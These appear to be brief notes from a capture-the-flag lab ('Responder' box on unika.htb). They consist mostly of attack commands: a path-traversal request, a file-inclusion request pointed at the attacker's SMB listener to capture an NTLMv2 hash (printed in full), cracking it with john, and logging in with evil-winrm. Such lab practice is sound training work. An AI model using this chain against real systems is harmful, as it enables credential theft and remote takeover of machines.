responder box

http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

fire up responder
sudo responder -I tun0
on firefox-esr
        http://unika.htb/index.php?page=//IP/somefile
        where IP is our tun0 interface we are listening on
responder gets
[SMB] NTLMv2-SSP Client   : 10.129.118.110
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:4a567307030548c6:9527B56516D198EB567D40B854FDE1B8:

echo the Administrator::RESPONDER:4a56.... to a file
john -w=/usr/share/wordlists/rockyou.txt responder.hash
the above retrieves the PASSWORD

use evil-winrm (a linux powershell equiv to get a login)
evil-winrm -i 10.129.118.110 -u administrator -p PASSWORD
